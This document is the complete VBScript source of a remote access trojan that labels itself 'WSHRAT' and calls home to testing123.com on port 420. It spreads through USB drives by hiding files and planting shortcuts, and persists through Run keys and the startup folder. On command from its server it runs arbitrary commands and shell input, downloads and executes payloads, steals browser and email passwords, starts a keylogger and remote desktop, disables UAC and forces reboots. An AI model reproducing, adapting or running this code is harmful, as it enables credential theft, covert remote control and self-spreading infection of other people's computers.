

host = "testing123.com"
port = 420
installdir = "%appdata%"
lnkfile = true
lnkfolder = true

'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")


'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "|"
sleep = 5000 
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce


'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
on error resume next


instance
while true

install

response = ""
response = post ("is-ready","")
cmd = split (response,spliter)
select case cmd (0)
case "disconnect"
	  wscript.quit
case "reboot"
	  shellobj.run "%comspec% /c shutdown /r /t 0 /f", 0, TRUE
case "shutdown"
	  shellobj.run "%comspec% /c shutdown /s /t 0 /f", 0, TRUE
case "excecute"
      param = cmd (1)
      execute param
case "get-pass" 
       passgrabber cmd(1), "cmdv.exe", cmd(2)
case "get-pass-offline"
	  passgrabber2 cmd(1), "cmdv.exe", cmd(2)
case "update"
      param = mid(response, instr(response, "|") + 1)
      oneonce.close
      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
      oneonce.write param
      oneonce.close
      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
      wscript.quit 
case "uninstall"
      uninstall
case "up-n-exec"
      download cmd (1),cmd (2)
case "bring-log"
      upload installdir & "wshlogs\" & cmd (1), "take-log"
case "down-n-exec"
      sitedownloader cmd (1),cmd (2)
case  "filemanager"
      servicestarter cmd(1), "fm-plugin.exe", information() 
case  "rdp"
      servicestarter cmd(1), "rd-plugin.exe", information()
case  "keylogger"
      keyloggerstarter cmd(1), "kl-plugin.exe", information(), 0
case  "offline-keylogger"
	  keyloggerstarter cmd(1), "kl-plugin.exe", information(), 1
case  "browse-logs"
	  post "is-logs", enumfaf(installdir & "wshlogs")
case  "cmd-shell"
      param = cmd (1)
      post "is-cmd-shell",cmdshell (param)
case  "get-processes"
      post "is-processes", enumprocess()
case  "disable-uac"
	  if WScript.Arguments.Named.Exists("elevated") = true then
		set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
		oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","EnableLUA", 0
		oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","ConsentPromptBehaviorAdmin", 0
		oReg = nothing
		updatestatus("UAC+Disabled+(Reboot+Required)")
	  end if
case  "elevate"
	  if WScript.Arguments.Named.Exists("elevated") = false then
		on error resume next
		oneonce.close()
		oneonce = nothing
		WScript.CreateObject("Shell.Application").ShellExecute "wscript.exe", " //B " & chr(34) & WScript.ScriptFullName & chr(34) & " /elevated", "", "runas", 1
		updatestatus("Client+Elevated")
		WScript.quit
	  else
		updatestatus("Client+Elevated")
	  end if
case  "if-elevate"
	  if WScript.Arguments.Named.Exists("elevated") = false then
		updatestatus("Client+Not+Elevated")
	  else
		updatestatus("Client+Elevated")
	  end if
case  "kill-process"
      exitprocess(cmd(1))
case  "sleep"
      param = cmd (1)
      sleep = eval (param)        
end select

wscript.sleep sleep

wend

sub install
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon

upstart
for each drive in filesystemobj.drives

if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
    end if
    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
        if not lnkfile then exit for
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (installname) then
                    filename = split(file.name,".")
                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
        if not lnkfolder then exit for
        folder.attributes = 2+4
        foldername = folder.name
        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
        lnkobj.windowstyle = 7
        lnkobj.targetpath = "cmd.exe"
        lnkobj.workingdirectory = ""
        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
        if  instr (foldericon,",") = 0 then
            lnkobj.iconlocation = folder.path
        else 
            lnkobj.iconlocation = foldericon
        end if
        lnkobj.save()
    next
end If
end If
end if
next
err.clear
end sub

sub uninstall
on error resume next
dim filename
dim foldername

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
filesystemobj.deletefile startup & installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for  each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in filesystemobj.getfolder ( drive.path & "\").files
         on error resume next
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (installname) then
                     filename = split(file.name,".")
                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     filesystemobj.deletefile (drive.path & "\" & file.name)
                 end If
             else
                 filesystemobj.deletefile (file.path) 
             end if
         end if
     next
     for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
         folder.attributes = 0
     next
end if
end if
end if
next
wscript.quit
end sub

function post (cmd ,param)

post = param
httpobj.open "post","http://" & host & ":" & port &"/" & cmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
end function

function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter

    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & spliter  
       exit for
    next
    inf = inf & "plus" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    information = "WSHRAT" & spliter & inf & spliter & "Visual Basic-v1.2" 
else
    information = inf
end if
end function


sub upstart ()
on error resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub


function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function


function security 
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "nan-av"
end function

function instance
on error resume next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end If

upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function

sub passgrabber (fileurl, filename, retcmd)
on error resume next
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
filesystemobj.deleteFile(installdir & filename & "data")
config_file = installdir & mid(filename, 1, instrrev(filename, ".")) & ".cfg"
cfg = "[General]" & vbcrlf & "ShowGridLines=0" & vbcrlf & "SaveFilterIndex=0" & vbcrlf & "ShowInfoTip=1" & vbcrlf & "UseProfileFolder=0" & vbcrlf & "ProfileFolder=" & vbcrlf & "MarkOddEvenRows=0" & vbcrlf & "WinPos=2C 00 00 00 00 00 00 00 01 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 80 02 00 00 E0 01 00 00" & vbcrlf & "Columns=FA 00 00 00 FA 00 01 00 6E 00 02 00 6E 00 03 00 78 00 04 00 78 00 05 00 78 00 06 00 64 00 07 00 FA 00 08 00" & vbcrlf & "Sort=0"
'write config
set writer = filesystemobj.openTextFile(config_file, 2, true)
writer.writeLine(cfg)
writer.close()
set writer = nothing

strlink = fileurl
strsaveto = installdir & filename

set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setRequestHeader "cache-control:", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   set runner = CreateObject("Shell.Application")
   saver = objfsodownload.getFile(strsaveto).shortPath
   
   'try 10 times before give up
   for i = 0 to 9
	shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
	wscript.sleep(1000)
	runner.shellexecute saver, " /stext " & saver & "data"
	wscript.sleep(2000)
	
	if objfsodownload.fileExists(saver & "data") then
		exit for
	end if
   next 
   
   deletefaf(strsaveto)
   upload saver & "data", retcmd
end if 
end sub

sub passgrabber2 (fileurl, filename, fileurl2)
for h = 0 to 1
on error resume next
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
filesystemobj.deleteFile(installdir & filename & "data")
config_file = installdir & mid(filename, 1, instrrev(filename, ".")) & ".cfg"
cfg = "[General]" & vbcrlf & "ShowGridLines=0" & vbcrlf & "SaveFilterIndex=0" & vbcrlf & "ShowInfoTip=1" & vbcrlf & "UseProfileFolder=0" & vbcrlf & "ProfileFolder=" & vbcrlf & "MarkOddEvenRows=0" & vbcrlf & "WinPos=2C 00 00 00 00 00 00 00 01 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 80 02 00 00 E0 01 00 00" & vbcrlf & "Columns=FA 00 00 00 FA 00 01 00 6E 00 02 00 6E 00 03 00 78 00 04 00 78 00 05 00 78 00 06 00 64 00 07 00 FA 00 08 00" & vbcrlf & "Sort=0"
'write config
set writer = filesystemobj.openTextFile(config_file, 2, true)
writer.writeLine(cfg)
writer.close()
set writer = nothing

strlink = fileurl
if h = 1 then
	strlink = fileurl2
end if
strsaveto = installdir & filename

set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setRequestHeader "cache-control:", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   set runner = CreateObject("Shell.Application")
   saver = objfsodownload.getFile(strsaveto).shortPath
   
   'try 10 times before give up
   for i = 0 to 9
	shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
	wscript.sleep(1000)
	runner.shellexecute saver, " /stext " & saver & "data"
	wscript.sleep(2000)
	
	if objfsodownload.fileExists(saver & "data") then
		dim  httpobj,objstreamuploade,buffer, outpath, folder
		set  objstreamuploade = createobject("adodb.stream")
		with objstreamuploade 
			 .type = 2 
			 .open
			 .loadfromfile saver & "data"
			 buffer = .readtext
			 .close
		end with
		set objstreamuploade = nothing
		
		outpath = installdir & "wshlogs\recovered_password_browser.log"
		if h = 1 then
			outpath = installdir & "wshlogs\recovered_password_email.log"
		end if
		folder = objfsodownload.GetParentFolderName(outpath)

		if not objfsodownload.FolderExists(folder) then
			shellobj.run "%comspec% /c mkdir " & chr(34) & folder & chr(34), 0, true
		end if
		set writer = filesystemobj.openTextFile(outpath, 2, true)
		writer.write(buffer)
		writer.close()
		set writer = nothing
		exit for
	end if
   next 
   deletefaf(strsaveto)
end if
next 
end sub

sub keyloggerstarter (fileurl, filename, filearg, is_offline)
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setrequestheader "cache-control:", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34) & " " & host & " " & port & " " & chr(34) & filearg & chr(34) & " " & is_offline
end if 
end sub

sub servicestarter (fileurl, filename, filearg)
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setrequestheader "cache-control:", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34) & " " & host & " " & port & " " & chr(34) & filearg & chr(34)
end if 
end sub

sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.serverxmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setrequestheader "cache-control", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
   updatestatus("Executed+File")
end if 
end sub

sub download (fileurl,filedir)
if filedir = "" then 
   filedir = installdir
end if

strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port &"/" & "send-to-me" & spliter & fileurl, false
objhttpdownload.setrequestheader "user-agent:",information
objhttpdownload.send ""
     
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
	set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
		 .type = 1 
		 .open
		 .write objhttpdownload.responsebody
		 .savetofile strsaveto
		 .close
	end with
    set objstreamdownload  = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
   updatestatus("Executed+File")
end if 
end sub

function updatestatus(status_msg)
	set objsoc = createobject("msxml2.xmlhttp")
	objsoc.open "post","http://" & host & ":" & port &"/" & "update-status" & spliter & status_msg, false
	objsoc.setrequestheader "user-agent:",information
	objsoc.send ""

end function

function upload (fileurl, retcmd)

dim  httpobj,objstreamuploade,buffer
set  objstreamuploade = createobject("adodb.stream")
with objstreamuploade 
     .type = 1 
     .open
	 .loadfromfile fileurl
	 buffer = .read
	 .close
end with
set objstreamdownload = nothing
set httpobj = createobject("msxml2.xmlhttp")
httpobj.open "post","http://" & host & ":" & port &"/" & retcmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send buffer
end function


sub deletefaf (url)
on error resume next

filesystemobj.deletefile url
filesystemobj.deletefolder url

end sub

function cmdshell (cmd)
dim httpobj,oexec,readallfromany
strsaveto = installdir & "out.txt"
shellobj.run "%comspec% /c " & cmd & " > " & chr(34) & strsaveto & chr(34), 0, true
readallfromany = filesystemobj.opentextfile(strsaveto).readall()
filesystemobj.deletefile strsaveto

cmdshell = readallfromany
end function


function enumprocess()
on error resume next

set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_process",,48)

dim objitem
for each objitem in colitems
	enumprocess = enumprocess & objitem.name & "^"
	enumprocess = enumprocess & objitem.processid & "^"
    enumprocess = enumprocess & objitem.executablepath & spliter
next
end function

sub exitprocess (pid)
on error resume next

shellobj.run "taskkill /F /T /PID " & pid,0,true
end sub

function getParentDirectory(path)
	set fo = filesystemobj.GetFile(path)
	getParentDirectory = filesystemobj.getparentfoldername(fo)
end function

function enumfaf (enumdir)

'enumfaf = enumdir & spliter
for  each folder in filesystemobj.getfolder (enumdir).subfolders
     enumfaf = enumfaf & folder.name & "^" & "" & "^" & "d" & "^" & folder.attributes & spliter
next

for  each file in filesystemobj.getfolder (enumdir).files
     enumfaf = enumfaf & file.name & "^" & file.size  & "^" & file.attributes & spliter
next
end function
